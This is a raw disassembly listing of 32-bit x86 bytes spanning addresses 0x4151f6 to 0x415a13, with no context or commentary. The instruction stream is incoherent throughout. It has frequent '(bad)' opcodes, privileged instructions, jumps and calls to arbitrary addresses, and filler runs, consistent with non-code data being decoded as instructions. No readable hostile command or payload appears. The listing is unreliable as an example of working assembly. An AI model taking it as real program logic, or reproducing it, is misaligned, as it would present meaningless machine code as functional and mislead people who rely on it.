  4151f6:	push   0xffffff9b
  4151f8:	add    BYTE PTR [eax],al
  4151fa:	add    BYTE PTR [eax],al
  4151fc:	add    BYTE PTR [edi+0x15],dh
  4151ff:	jecxz  0x4151d3
  415201:	cli    
  415202:	stos   DWORD PTR es:[edi],eax
  415203:	jmp    0x343e:0xe42f2d2
  41520a:	mov    WORD PTR [ebx],gs
  41520c:	call   0xe86cdd8b
  415211:	outs   dx,BYTE PTR ds:[esi]
  415212:	mov    esp,DWORD PTR [edi]
  415214:	or     ah,bh
  415216:	dec    ecx
  415217:	jecxz  0x4151f3
  415219:	retf   
  41521a:	or     eax,0xc3c2d2ea
  41521f:	loop   0x4151e4
  415221:	hlt    
  415222:	mov    ds:0xc1367700,al
  415227:	push   0xffffffe9
  415229:	sahf   
  41522a:	dec    ebp
  41522b:	cmp    ch,BYTE PTR [eax+0x5e382c76]
  415231:	xchg   dh,bh
  415233:	cld    
  415234:	sbb    DWORD PTR [ecx],esp
  415236:	(bad)  [edx]
  415238:	jmp    0x4152b0
  41523a:	add    esp,0x4489b7dd
  415240:	add    eax,0xd4c8965
  415245:	xor    DWORD PTR [eax],0xff92b589
  41524b:	cld    
  41524c:	fcomip st,st(7)
  41524e:	ret    0xb908
  415251:	not    DWORD PTR [edi+0x8]
  415254:	add    DWORD PTR [ebp+0x1],edx
  415257:	add    cl,ch
  415259:	neg    BYTE PTR [eax]
  41525b:	add    al,0xe9
  41525d:	inc    eax
  41525e:	adc    eax,DWORD PTR [edx]
  415260:	test   BYTE PTR [eax],0x0
  415263:	add    BYTE PTR [eax],al
  415265:	add    BYTE PTR [edi+0x226253c1],bh
  41526b:	sub    esp,0xf089a0d9
  415271:	jb     0x415226
  415273:	(bad)  
  415274:	push   esp
  415275:	jb     0x4152f1
  415277:	or     al,BYTE PTR [ecx]
  415279:	es jge 0x4152a5
  41527c:	(bad)  
  41527d:	adc    DWORD PTR [ecx],ebx
  41527f:	fcomp  QWORD PTR [esi+eax*8-0x20]
  415283:	jge    0x415245
  415285:	out    dx,al
  415286:	bnd jb 0x415289
  415289:	jmp    0xe587dc04
  41528e:	gs rcr eax,1
  415291:	jo     0x41524d
  415293:	xchg   edx,eax
  415294:	xchg   DWORD PTR [edi*8+0x70ed5cce],edi
  41529b:	adc    BYTE PTR [edi+0x2a8e92c],al
  4152a1:	add    BYTE PTR [edi+0xf3f8759],bh
  4152a7:	clc    
  4152a8:	test   DWORD PTR [ecx+0x5d356289],0x8b27f86c
  4152b2:	rol    BYTE PTR [edi-0x171bfcbc],cl
  4152b8:	adc    edx,DWORD PTR [eax+0x59]
  4152bb:	cmp    eax,0x8f3b5008
  4152c0:	inc    ecx
  4152c1:	push   ss
  4152c2:	or     al,0x3
  4152c4:	jg     0x41528a
  4152c6:	enter  0xc07f,0x74
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	add    BYTE PTR [eax],al
  4152ce:	add    BYTE PTR [eax],cl
  4152d0:	jbe    0x415313
  4152d2:	cld    
  4152d3:	pop    ss
  4152d4:	aas    
  4152d5:	cld    
  4152d6:	or     DWORD PTR [edi-0x4a],0x38
  4152da:	inc    ebp
  4152db:	jl     0x4152bf
  4152dd:	xlat   BYTE PTR ds:[ebx]
  4152de:	mov    esp,DWORD PTR [ebx-0x77]
  4152e1:	into   
  4152e2:	call   0x3cc886
  4152e7:	adc    BYTE PTR [esi+0x48071b71],bh
  4152ed:	add    al,0x8b
  4152ef:	popf   
  4152f0:	jmp    0x4152b1
  4152f2:	cmp    BYTE PTR [edi+0x0],bl
  4152f5:	push   0x38
  4152f7:	(bad)  
  4152f8:	iret   
  4152f9:	dec    edi
  4152fa:	mov    DWORD PTR [edx+0x6815fb0a],ecx
  415300:	mov    WORD PTR ds:0xcbddf00,?
  415306:	call   DWORD PTR [ecx+0x447d877a]
  41530c:	mov    eax,DWORD PTR [ecx-0xc]
  41530f:	lahf   
  415310:	cmp    al,0xf8
  415312:	cmp    BYTE PTR [edi],ah
  415314:	aas    
  415315:	add    al,0x7c
  415317:	stos   DWORD PTR es:[edi],eax
  415318:	mov    cl,BYTE PTR [esi+0x4]
  41531b:	xchg   ecx,ecx
  41531d:	cmp    al,ch
  41531f:	jne    0x41536c
  415321:	cmp    edi,ebp
  415323:	or     bh,BYTE PTR [edx+eax*1]
  415326:	pop    ecx
  415327:	mov    ds:0x71c2c8dd,al
  41532c:	stos   DWORD PTR es:[edi],eax
  41532d:	mov    BYTE PTR [ebx-0xf],al
  415330:	sar    DWORD PTR es:[eax+0x0],0x0
  415335:	add    BYTE PTR [eax],al
  415337:	add    BYTE PTR [esi],bl
  415339:	add    al,BYTE PTR [esi+edx*2]
  41533c:	int    0x73
  41533e:	add    DWORD PTR [eax],eax
  415340:	jne    0x415372
  415342:	retf   0x5180
  415345:	pop    es
  415346:	or     BYTE PTR [eax],al
  415348:	and    ecx,DWORD PTR [eax+ecx*4-0x8]
  41534c:	out    dx,al
  41534d:	ficom  DWORD PTR [eax+ecx*1]
  415350:	int    0x90
  415352:	stc    
  415353:	(bad)  
  415354:	mov    dl,0x22
  415356:	inc    esp
  415357:	add    al,0xfe
  415359:	(bad)  [eax-0x64235fe2]
  41535f:	test   BYTE PTR [ebp-0x4acdfa92],dh
  415365:	add    dh,ch
  415367:	mov    BYTE PTR [ebx],bh
  415369:	lahf   
  41536a:	inc    edx
  41536b:	imul   ebp,DWORD PTR [ebx+eax*8-0x6be4a957],0x17358499
  415376:	lods   eax,DWORD PTR ds:[esi]
  415377:	mov    DWORD PTR [ebx-0x31407761],edi
  41537d:	imul   ebx,esp,0x0
  415380:	jae    0x4153b3
  415382:	fdivr  QWORD PTR [esi]
  415384:	stos   BYTE PTR es:[edi],al
  415385:	fisttp DWORD PTR [edx-0x103b8eb2]
  41538b:	cmp    ebp,DWORD PTR [ebx-0x15]
  41538e:	add    eax,DWORD PTR [ecx-0xae58cf]
  415394:	shr    ebp,cl
  415396:	lds    eax,FWORD PTR [esi*2+0xec8cee]
  41539d:	add    BYTE PTR [eax],al
  41539f:	add    BYTE PTR [eax],al
  4153a1:	test   BYTE PTR [ecx],0x93
  4153a4:	inc    esp
  4153a5:	ret    
  4153a6:	xchg   DWORD PTR [eax+eax*8],edx
  4153a9:	sbb    eax,0x7503ea7a
  4153ae:	mov    DWORD PTR [esp+ecx*1],ebx
  4153b1:	pop    DWORD PTR [ebx]
  4153b3:	jb     0x415377
  4153b5:	or     eax,0xf09b7e85
  4153ba:	xor    esp,DWORD PTR [eax+0x150271c6]
  4153c0:	xor    ebp,esp
  4153c2:	cdq    
  4153c3:	jb     0x41535a
  4153c5:	int    0x75
  4153c7:	test   BYTE PTR [esi*2-0x2005175],0xc0
  4153cf:	aas    
  4153d0:	imul   eax,ecx,0xffffff94
  4153d3:	inc    esi
  4153d4:	xor    BYTE PTR [ebp-0x54d12cf3],0xd9
  4153db:	jmp    0x961b70b6
  4153e0:	xor    DWORD PTR [eax+0x5af1e2ee],esp
  4153e6:	add    ch,BYTE PTR [edx-0x40]
  4153e9:	adc    DWORD PTR [edx-0x18],0xb4c12b3a
  4153f0:	mov    ss,WORD PTR [ecx+0x6d497232]
  4153f6:	sub    DWORD PTR [edi],esp
  4153f8:	fdiv   QWORD PTR [ebp+0x1]
  4153fb:	lea    eax,[esi+0x36e6e2e8]
  415401:	retf   
  415402:	xchg   DWORD PTR [edi+0xc1],edi
  415408:	add    BYTE PTR [eax],al
  41540a:	mov    dh,0x93
  41540c:	out    0xf,eax
  41540e:	mov    bl,0x28
  415410:	jmp    0x41539a
  415412:	shl    dh,0x5b
  415415:	inc    esi
  415416:	popa   
  415417:	sub    al,0x17
  415419:	fwait
  41541a:	data16 ds aad 0x43
  41541e:	jne    0x41549f
  415420:	add    BYTE PTR [ebp+0x35c07f72],ch
  415426:	push   cs
  415427:	mov    DWORD PTR cs:[ecx+ebp*2],ebx
  41542b:	stos   BYTE PTR es:[edi],al
  41542c:	cmp    al,0x9c
  41542e:	out    dx,eax
  41542f:	xchg   ebp,eax
  415430:	adc    DWORD PTR [ecx-0x5664fa90],0xbd73c282
  41543a:	push   ds
  41543b:	inc    ecx
  41543c:	or     al,0xf4
  41543e:	jmp    0x415469
  415440:	add    al,0x64
  415442:	aaa    
  415443:	test   BYTE PTR [edi+0x5c],0x3b
  415447:	test   BYTE PTR [edi+0x66],0xe5
  41544b:	xlat   BYTE PTR ds:[ebx]
  41544c:	adc    eax,0xc48176a9
  415451:	in     eax,0xb4
  415453:	aas    
  415454:	std    
  415455:	call   0x986a1c9
  41545a:	xchg   edi,eax
  41545b:	retf   
  41545c:	inc    eax
  41545d:	or     DWORD PTR [ebp+0x72b48004],eax
  415463:	add    dh,BYTE PTR [ebx-0x1b]
  415466:	push   esp
  415467:	jnp    0x4154aa
  415469:	leave  
  41546a:	mov    ah,0x3f
  41546c:	std    
  41546d:	call   0x415472
  415472:	add    BYTE PTR [ecx+eax*4+0x7d],dl
  415476:	fnsave [esi+0xe]
  415479:	pop    esi
  41547a:	add    DWORD PTR [esi-0x12328a78],0x41
  415481:	and    al,0x97
  415483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415484:	xchg   ebp,eax
  415485:	adc    ebp,DWORD PTR [ebp+0x69ffd364]
  41548b:	and    al,BYTE PTR [esi]
  41548d:	sub    DWORD PTR [ecx+0x7255e585],0xffffff82
  415494:	or     ch,al
  415496:	mul    bl
  415498:	xchg   esp,eax
  415499:	std    
  41549a:	push   0xffffffe1
  41549c:	dec    DWORD PTR [eax+eax*1]
  41549f:	sar    DWORD PTR [esi-0x4d963f7c],1
  4154a5:	xor    eax,0xf041045
  4154aa:	push   0x3c
  4154ac:	jl     0x4154f1
  4154ae:	and    al,0x5c
  4154b0:	jnp    0x4154f1
  4154b2:	and    al,0x4c
  4154b4:	jns    0x4154c7
  4154b6:	cmp    al,0xa
  4154b8:	aas    
  4154b9:	add    BYTE PTR [ebx+0x45c609d8],al
  4154bf:	repz dec BYTE PTR [edx]
  4154c2:	mov    bh,0x9b
  4154c4:	mov    dl,0x63
  4154c6:	cmp    DWORD PTR [edi+0x4c0e71b2],ebx
  4154cc:	jmp    0x4154d9
  4154ce:	add    BYTE PTR [ecx+0x1f896392],bh
  4154d4:	ret    
  4154d5:	ret    
  4154d6:	inc    ebp
  4154d7:	add    BYTE PTR [eax],al
  4154d9:	add    BYTE PTR [eax],al
  4154db:	add    BYTE PTR [ebx],ah
  4154dd:	dec    DWORD PTR [ecx+0x56d83345]
  4154e3:	leave  
  4154e4:	mov    es,WORD PTR [esi]
  4154e6:	add    BYTE PTR [ebx+0x5c],ch
  4154e9:	mov    dh,0x53
  4154eb:	mov    ebp,DWORD PTR [ebp-0x7b]
  4154ee:	push   cs
  4154ef:	(bad)  
  4154f0:	enter  0x86ff,0x46
  4154f4:	mov    ch,ah
  4154f6:	mov    edi,0x37bf9f38
  4154fb:	shr    esi,1
  4154fd:	add    eax,0xcca44a89
  415502:	out    0xdc,eax
  415504:	sar    BYTE PTR [ecx-0x5],cl
  415507:	jmp    0x415567
  415509:	mov    eax,0xf29c84bd
  41550e:	or     eax,0x889202ff
  415513:	dec    esi
  415514:	dec    eax
  415515:	ffreep st(4)
  415517:	cmp    BYTE PTR [edi+eax*8],ah
  41551a:	pop    esp
  41551b:	push   DWORD PTR [ebp-0x48]
  41551e:	aaa    
  41551f:	shr    DWORD PTR [eax-0x57765adc],0x93
  415526:	test   ah,ch
  415528:	pop    ebp
  415529:	in     al,dx
  41552a:	cs mov eax,eax
  41552d:	jae    0x4154d8
  41552f:	mov    dl,0x75
  415531:	fwait
  415532:	add    DWORD PTR [ecx],esi
  415534:	mov    ds:0xac930437,eax
  41553a:	aam    0xfc
  41553c:	(bad)  
  41553d:	mov    eax,ds:0x4b8c
  415542:	add    BYTE PTR [eax],al
  415544:	add    BYTE PTR [ebp+0x2e],ch
  415547:	cmp    eax,0x2e166d05
  41554c:	in     al,dx
  41554d:	frstor [ebx]
  41554f:	add    DWORD PTR [eax],eax
  415551:	jne    0x415558
  415553:	lock mov bh,BYTE PTR [eax]
  415556:	rdtsc  
  415558:	mov    esi,DWORD PTR [eax]
  41555a:	inc    ebx
  41555b:	xor    ebp,edi
  41555d:	push   0x753fef67
  415562:	sbb    al,0xbd
  415564:	or     al,0xf8
  415566:	fistp  DWORD PTR [eax]
  415568:	adc    dh,BYTE PTR [esi]
  41556a:	sbb    al,0xc0
  41556c:	cmp    BYTE PTR [esi+0x71],ch
  41556f:	std    
  415570:	jnp    0x41552c
  415572:	sbb    al,0xc9
  415574:	std    
  415575:	inc    edx
  415576:	je     0x415542
  415578:	ret    0x9b71
  41557b:	mov    ecx,es
  41557d:	sahf   
  41557e:	stc    
  41557f:	xor    esi,DWORD PTR [ecx]
  415581:	scas   al,BYTE PTR es:[edi]
  415582:	push   eax
  415583:	ficomp DWORD PTR [ebp+0x79]
  415586:	sbb    esi,0xff147a30
  41558c:	imul   ecx,DWORD PTR [ecx+0x7d053d1e],0x9974986b
  415596:	mov    bh,0x98
  415598:	adc    esi,DWORD PTR [ecx+0x7543fd02]
  41559e:	test   DWORD PTR [ebx+0x5bc1f608],esp
  4155a4:	cmc    
  4155a5:	mov    ch,0x85
  4155a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a8:	fadd   QWORD PTR [eax]
  4155aa:	add    BYTE PTR [eax],al
  4155ac:	add    BYTE PTR [eax],al
  4155ae:	jge    0x4155e0
  4155b0:	jmp    0x4155c9
  4155b2:	dec    esi
  4155b3:	test   DWORD PTR [edi-0x56d23769],ebp
  4155b9:	add    BYTE PTR [ebp+0x7d],dh
  4155bc:	stos   BYTE PTR es:[edi],al
  4155bd:	stos   DWORD PTR es:[edi],eax
  4155be:	and    ch,dl
  4155c0:	mov    eax,0x1306c2dd
  4155c5:	fist   WORD PTR [eax-0x781bc935]
  4155cb:	or     BYTE PTR ds:0xfad6aadd,al
  4155d1:	cli    
  4155d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d3:	mov    ebx,0xf5e28415
  4155d8:	stc    
  4155d9:	add    eax,0x96785870
  4155de:	sbb    cl,dl
  4155e0:	mov    edx,0x57167afd
  4155e5:	test   dl,al
  4155e7:	cmc    
  4155e8:	in     eax,0x70
  4155ea:	mov    ch,0x2f
  4155ec:	sub    dl,dl
  4155ee:	cli    
  4155ef:	les    ebx,FWORD PTR [ebp-0x2e6c03d2]
  4155f5:	out    dx,eax
  4155f6:	pop    ebp
  4155f7:	mov    edx,0x7c409402
  4155fc:	rol    DWORD PTR [edi+eiz*2],cl
  4155ff:	repnz outs dx,BYTE PTR ds:[esi]
  415601:	lock js 0x415646
  415604:	scas   al,BYTE PTR es:[edi]
  415605:	adc    BYTE PTR [ecx+0x26c2b530],al
  41560b:	jge    0x415608
  41560d:	mov    dh,BYTE PTR [esi]
  41560f:	(bad)  
  415610:	imul   ebp,DWORD PTR [eax+0x0],0x947d9d00
  41561a:	mov    ebx,0xf600b65d
  41561f:	or     ecx,DWORD PTR [esi+0x7972a489]
  415625:	dec    ebx
  415626:	icebp  
  415627:	std    
  415628:	xor    ebp,esp
  41562a:	ror    DWORD PTR [ebx],1
  41562c:	mov    ?,ebp
  41562e:	(bad)  
  41562f:	mov    esi,?
  415631:	mov    ah,BYTE PTR [ecx*1-0xed374cd]
  415638:	xor    bh,ch
  41563a:	aam    0x6a
  41563c:	clc    
  41563d:	aas    
  41563e:	jmp    0xa04e1d3a
  415643:	xor    al,0xfb
  415645:	(bad)  
  415646:	cmp    edi,esi
  415648:	sahf   
  415649:	jg     0x4155d8
  41564b:	loop   0x4155dc
  41564d:	std    
  41564e:	jmp    0x54cc8ba3
  415653:	cli    
  415654:	(bad)  
  415655:	std    
  415656:	xchg   BYTE PTR [esi],bl
  415658:	repz (bad)
  41565b:	jbe    0x41562e
  41565d:	mov    edi,0xf413ec29
  415662:	or     DWORD PTR [edi-0x21700e6],0xe35f0883
  41566c:	lea    edx,[eax+0x56]
  41566f:	lds    edi,FWORD PTR [edi+0x12]
  415672:	test   eax,0x99c00176
  415677:	std    
  415678:	or     DWORD PTR [eax],0x3f
  41567b:	add    BYTE PTR [eax],al
  41567d:	add    BYTE PTR [eax],al
  41567f:	add    BYTE PTR [ebx],al
  415681:	mov    ss,WORD PTR [eax+0x62]
  415684:	loopne 0x415620
  415686:	retf   0x71c1
  415689:	add    bh,BYTE PTR [ebp+0x41ba21]
  41568f:	gs mov dh,0x16
  415692:	cmp    al,0x83
  415694:	xchg   BYTE PTR [ebx+eax*4+0x65],bh
  415698:	loopne 0x415627
  41569a:	std    
  41569b:	add    BYTE PTR [esp+edi*2],cl
  41569e:	(bad)  
  41569f:	call   0x3e3251
  4156a4:	rol    bl,1
  4156a6:	je     0x4156d0
  4156a8:	xlat   BYTE PTR ds:[ebx]
  4156a9:	dec    ebp
  4156aa:	call   0x44fbf7
  4156af:	test   BYTE PTR [edx+esi*8],bl
  4156b2:	sbb    BYTE PTR [ebx+0x68725e12],cl
  4156b8:	dec    ebp
  4156b9:	add    esi,DWORD PTR [ebp+0x31dee]
  4156bf:	lea    edx,[ecx-0x140001fe]
  4156c5:	dec    edi
  4156c6:	add    BYTE PTR [eax],al
  4156c8:	dec    esp
  4156c9:	cmp    esi,DWORD PTR [ecx-0x7]
  4156cc:	lods   al,BYTE PTR ds:[esi]
  4156cd:	add    esp,edi
  4156cf:	cmp    ah,BYTE PTR [esi-0x6e]
  4156d2:	add    BYTE PTR [bp+di+0x75],al
  4156d6:	adc    DWORD PTR [eax+0x2],eax
  4156d9:	inc    ebx
  4156da:	add    BYTE PTR [edx-0x34],ch
  4156dd:	xchg   DWORD PTR [ecx-0x48a957c],eax
  4156e3:	push   eax
  4156e4:	add    BYTE PTR [eax],al
  4156e6:	add    BYTE PTR [eax],al
  4156e8:	add    BYTE PTR [ebx-0x3dc3ee8b],al
  4156ee:	inc    edx
  4156ef:	add    BYTE PTR [ebx+0x458a8ea0],al
  4156f5:	and    BYTE PTR [esi+0x36],bl
  4156f8:	push   0xeeb502cd
  4156fd:	int    0x2
  4156ff:	add    BYTE PTR [ebp-0x1fddf],cl
  415705:	imul   edx,DWORD PTR [eax+0x0],0x0
  415709:	int3   
  41570a:	cmp    esi,DWORD PTR [ecx-0x7]
  41570d:	sahf   
  41570e:	ret    0x5e5b
  415711:	inc    ebp
  415712:	rol    DWORD PTR [eax+0x3f5f2c3d],0x0
  415719:	jne    0x4156b4
  41571b:	push   cs
  41571c:	xor    esp,DWORD PTR [ebx]
  41571e:	aas    
  41571f:	int3   
  415720:	shl    DWORD PTR [esi-0x7f02d465],cl
  415726:	mov    bh,0xf0
  415728:	aas    
  415729:	jne    0x415746
  41572b:	aad    0xaf
  41572d:	inc    eax
  41572e:	pop    ecx
  41572f:	add    DWORD PTR [eax],eax
  415731:	enter  0xa98c,0x1a
  415735:	dec    edx
  415736:	lods   eax,DWORD PTR ds:[esi]
  415737:	xchg   esp,eax
  415738:	test   BYTE PTR ds:0x90810630,dh
  41573e:	ja     0x4156ee
  415740:	inc    ecx
  415741:	jne    0x4156de
  415743:	mov    ebx,0x4076e503
  415748:	add    BYTE PTR [ebp+ebp*8-0x6e],dh
  41574c:	adc    eax,DWORD PTR [eax]
  41574e:	add    BYTE PTR [eax],al
  415750:	add    BYTE PTR [eax],al
  415752:	jge    0x4156fc
  415754:	inc    ecx
  415755:	add    BYTE PTR [ebx-0x493366dd],dh
  41575b:	fwait
  41575c:	shr    BYTE PTR [edx+0x69],0x83
  415760:	dec    esi
  415761:	std    
  415762:	cli    
  415763:	jl     0x415796
  415765:	std    
  415766:	imul   edi,DWORD PTR [edi-0x187f02fb],0x18753fed
  415770:	mov    ebp,0xf873e20c
  415775:	mov    edi,0xfffcd935
  41577a:	daa    
  41577b:	adc    dh,dh
  41577d:	cmp    ebp,DWORD PTR [ebx+0x5b]
  415780:	add    DWORD PTR [ecx],esi
  415782:	mov    ch,0x56
  415784:	sbb    eax,DWORD PTR [edi-0x78e206c5]
  41578a:	xor    edx,DWORD PTR [ebp+0x5cf01427]
  415790:	add    dl,BYTE PTR [eax-0x18]
  415793:	or     DWORD PTR gs:[ecx],esi
  415796:	mov    al,ds:0x5b8ab702
  41579b:	jnp    0x41572a
  41579d:	inc    DWORD PTR [ecx+0x69bf6ab1]
  4157a3:	sbb    bl,ah
  4157a5:	sbb    eax,0xfe01daa
  4157aa:	jns    0x41582b
  4157ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157ad:	out    dx,al
  4157ae:	mov    dl,0x7f
  4157b0:	lods   eax,DWORD PTR ds:[esi]
  4157b1:	imul   DWORD PTR [edx+0xa81a8d]
  4157b7:	add    BYTE PTR [eax],al
  4157b9:	add    BYTE PTR [eax],al
  4157bb:	jl     0x41583c
  4157bd:	sub    eax,0xde32a7f0
  4157c2:	stc    
  4157c3:	xor    ah,0x26
  4157c6:	add    al,0xd3
  4157c8:	jns    0x4157f0
  4157ca:	in     eax,dx
  4157cb:	cmc    
  4157cc:	(bad)
  4157cf:	repnz inc ebx
  4157d1:	pop    es
  4157d2:	call   0xcb90:0xef3b0078
  4157d9:	cmp    eax,0x10f786df
  4157de:	hlt    
  4157df:	inc    DWORD PTR [edx+eax*1+0x34]
  4157e3:	out    dx,al
  4157e4:	inc    ebx
  4157e5:	retf   
  4157e6:	xor    edi,eax
  4157e8:	mov    al,0x5
  4157ea:	jg     0x415824
  4157ec:	fldcw  WORD PTR [ecx-0x38]
  4157ef:	jns    0x41578a
  4157f1:	fstp   DWORD PTR ds:0xe82d7f85
  4157f7:	inc    edi
  4157f8:	xor    ch,BYTE PTR [esi-0x7]
  4157fb:	xchg   edx,eax
  4157fc:	hlt    
  4157fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157fe:	add    esi,esp
  415800:	(bad)
  415803:	add    ch,BYTE PTR [edi]
  415805:	int    0x7c
  415807:	xor    edx,esi
  415809:	mov    cl,0xc6
  41580b:	inc    esp
  41580c:	aaa    
  41580d:	jb     0x4157f0
  41580f:	outs   dx,BYTE PTR ds:[esi]
  415810:	hlt    
  415811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415812:	add    ecx,DWORD PTR [edi]
  415814:	idiv   bh
  415816:	arpl   WORD PTR [esi],bp
  415818:	cli    
  415819:	dec    edi
  41581a:	pop    esp
  41581b:	aas    
  41581c:	lea    ecx,[ebp+0x2f]
  41581f:	add    BYTE PTR [eax],al
  415821:	add    BYTE PTR [eax],al
  415823:	add    BYTE PTR [edi+0x2],bh
  415826:	std    
  415827:	xor    al,0x2
  415829:	jmp    0x278576d
  41582e:	and    DWORD PTR ds:0x86812475,0xe5678c56
  415838:	mov    bh,dh
  41583a:	mov    ch,BYTE PTR [esi-0x5874c3b6]
  415840:	dec    ebp
  415841:	cmp    al,0xfd
  415843:	mov    esp,0x278afaeb
  415848:	cmp    al,0x1a
  41584a:	add    BYTE PTR [ecx],bh
  41584c:	out    0xb1,al
  41584e:	bound  di,DWORD PTR [edi+0x2aad80e2]
  415855:	xchg   DWORD PTR es:[edi],esp
  415858:	adc    BYTE PTR [esi],ah
  41585a:	xor    DWORD PTR [esi],0xd9678c3d
  415860:	push   0xfffffff4
  415862:	mov    ch,BYTE PTR [esi]
  415864:	sbb    eax,0x12278b3c
  415869:	cmp    al,0xfd
  41586b:	mov    esp,0xd545794c
  415870:	sti    
  415871:	(bad)  
  415872:	or     al,0x69
  415874:	je     0x415876
  415876:	jmp    0x19864e67
  41587b:	add    esi,DWORD PTR [ecx+0x32]
  41587e:	std    
  41587f:	call   0x27b1:0x1a0cc6fb
  415886:	data16 jo 0x415889
  415889:	add    BYTE PTR [eax],al
  41588b:	add    BYTE PTR [eax],al
  41588d:	sub    al,0xd9
  41588f:	pop    eax
  415890:	sub    al,BYTE PTR [ebx-0x6cee95cc]
  415896:	add    dl,BYTE PTR [ebp+0x0]
  415899:	daa    
  41589a:	outs   dx,DWORD PTR ds:[esi]
  41589b:	sti    
  41589c:	adc    eax,0x3d89cc
  4158a1:	pop    ss
  4158a2:	cmp    DWORD PTR [eax],edx
  4158a4:	mov    eax,ecx
  4158a6:	mov    ebx,0x689c4013
  4158ab:	fcomp  DWORD PTR [ebx]
  4158ad:	dec    esp
  4158ae:	or     BYTE PTR [esi+0x16],0xaf
  4158b2:	(bad)  
  4158b3:	jg     0x415875
  4158b5:	fs in  eax,dx
  4158b7:	adc    edx,DWORD PTR [eax-0x1f]
  4158ba:	cmp    BYTE PTR [eax],cl
  4158bc:	push   eax
  4158bd:	arpl   WORD PTR [ebp-0x77],dx
  4158c0:	inc    esi
  4158c1:	adc    al,0x0
  4158c3:	mov    bl,0x30
  4158c5:	ffreep st(3)
  4158c7:	sbb    bh,dh
  4158c9:	xor    bl,BYTE PTR [ebp+0x11c23f3]
  4158cf:	mov    bl,0x6
  4158d1:	xchg   esp,eax
  4158d2:	into   
  4158d3:	jae    0x4158fe
  4158d5:	lahf   
  4158d6:	outs   dx,BYTE PTR ds:[esi]
  4158d7:	adc    DWORD PTR [ebp+0x5a],esi
  4158da:	in     al,dx
  4158db:	jge    0x8d8ee73b
  4158e1:	dec    ebx
  4158e2:	call   0x4686:0xd7efff4d
  4158e9:	push   ds
  4158ea:	add    dh,BYTE PTR [esi-0x4326f0b2]
  4158f0:	loopne 0x4158f2
  4158f2:	add    BYTE PTR [eax],al
  4158f4:	add    BYTE PTR [eax],al
  4158f6:	adc    al,0x86
  4158f8:	les    ecx,FWORD PTR [edx+edi*2]
  4158fb:	lea    edi,[esi+0x34396566]
  415901:	jmp    0x4158b1
  415903:	in     al,dx
  415904:	add    ecx,DWORD PTR [ebp-0x72b00576]
  41590a:	fwait
  41590b:	xchg   edx,eax
  41590c:	dec    ebp
  41590d:	dec    DWORD PTR [edi-0x31b97928]
  415913:	add    DWORD PTR [esi+0x2798754e],esi
  415919:	mov    edi,0xc484a095
  41591e:	jns    0x4158db
  415920:	cld    
  415921:	mov    esi,0x2047121b
  415926:	cmp    esi,DWORD PTR [eax-0x3c]
  415929:	push   esi
  41592a:	dec    al
  41592c:	cmp    BYTE PTR [esi+0x19751],0x75
  415933:	jbe    0x415916
  415935:	addr16 jne 0x4158d9
  415938:	add    DWORD PTR [eax],eax
  41593a:	pop    ebp
  41593b:	jp     0x415967
  41593d:	std    
  41593e:	push   0x13
  415940:	mov    ah,BYTE PTR [edi+esi*2]
  415943:	fwait
  415944:	add    DWORD PTR [ebx+0x69fd0735],eax
  41594a:	jge    0x4158e4
  41594c:	not    BYTE PTR [ebx]
  41594e:	arpl   bx,bx
  415950:	add    esi,DWORD PTR [edx]
  415952:	xor    eax,0x74b0c2ca
  415957:	rol    edx,1
  415959:	push   esi
  41595a:	add    BYTE PTR [eax],al
  41595c:	add    BYTE PTR [eax],al
  41595e:	add    BYTE PTR [edx],dh
  415960:	xor    al,ch
  415962:	or     edi,esi
  415964:	dec    ebx
  415965:	nop
  415966:	je     0x4159c1
  415968:	xchg   edi,eax
  415969:	cdq    
  41596a:	add    BYTE PTR [edi+0x35319050],ah
  415970:	popa   
  415971:	pop    es
  415972:	ins    BYTE PTR es:[edi],dx
  415973:	sbb    bl,0x3
  415976:	xchg   DWORD PTR [ebx+0x59867a8f],edi
  41597c:	call   0x1e5:0x21fc0001
  415983:	jne    0x415920
  415985:	jp     0x41590d
  415987:	lea    ebx,[ebp+0x59ee0001]
  41598d:	das    
  41598e:	ret    0x9b7d
  415991:	aaa    
  415992:	mov    esp,eax
  415994:	add    cl,BYTE PTR [edi-0xc]
  415997:	ret    0xe789
  41599a:	cdq    
  41599b:	xor    esi,ebx
  41599d:	fiadd  WORD PTR [edx]
  41599f:	sub    DWORD PTR [eax],eax
  4159a1:	mov    ch,0x9b
  4159a3:	imul   ebp,DWORD PTR [ebx],0xc0ec9046
  4159a9:	popf   
  4159aa:	lds    esi,FWORD PTR [ecx+0x2]
  4159ad:	ss pop ecx
  4159af:	pop    ecx
  4159b0:	add    al,0xe7
  4159b2:	add    esi,DWORD PTR [eax+0x35169300]
  4159b8:	add    cl,BYTE PTR [edi]
  4159ba:	out    0x23,al
  4159bc:	mov    DWORD PTR [esi],edx
  4159be:	jl     0x415a03
  4159c0:	fwait
  4159c1:	sbb    DWORD PTR ds:0x0,edx
  4159c7:	add    BYTE PTR [eax-0x77],ch
  4159ca:	popf   
  4159cb:	cdq    
  4159cc:	xor    al,0x3
  4159ce:	jae    0x4159c3
  4159d0:	int3   
  4159d1:	out    dx,al
  4159d2:	arpl   WORD PTR [eax+0x3e70371],cx
  4159d8:	scas   eax,DWORD PTR es:[edi]
  4159d9:	jge    0x4159b3
  4159db:	pushf  
  4159dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159dd:	inc    eax
  4159de:	call   0xea069ce6
  4159e3:	pop    ss
  4159e4:	pop    ebp
  4159e5:	jge    0x415a0a
  4159e7:	call   0x18e8d95e
  4159ec:	jae    0x415973
  4159ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159ef:	or     ch,al
  4159f1:	ja     0x415a21
  4159f3:	clc    
  4159f4:	sbb    al,BYTE PTR [ecx]
  4159f6:	and    eax,0xf99d7505
  4159fb:	fwait
  4159fc:	inc    ecx
  4159fd:	xchg   DWORD PTR [esi+0x61ee8f8f],ebx
  415a03:	xchg   esp,eax
  415a04:	dec    edi
  415a05:	ja     0x415a2d
  415a07:	clc    
  415a08:	rcr    dh,cl
  415a0a:	sub    al,0x5
  415a0c:	jne    0x415a89
  415a0e:	pop    esi
  415a0f:	fdiv   QWORD PTR [edx+eax*1+0x0]
  415a13:	jmp    0xe9461eb8
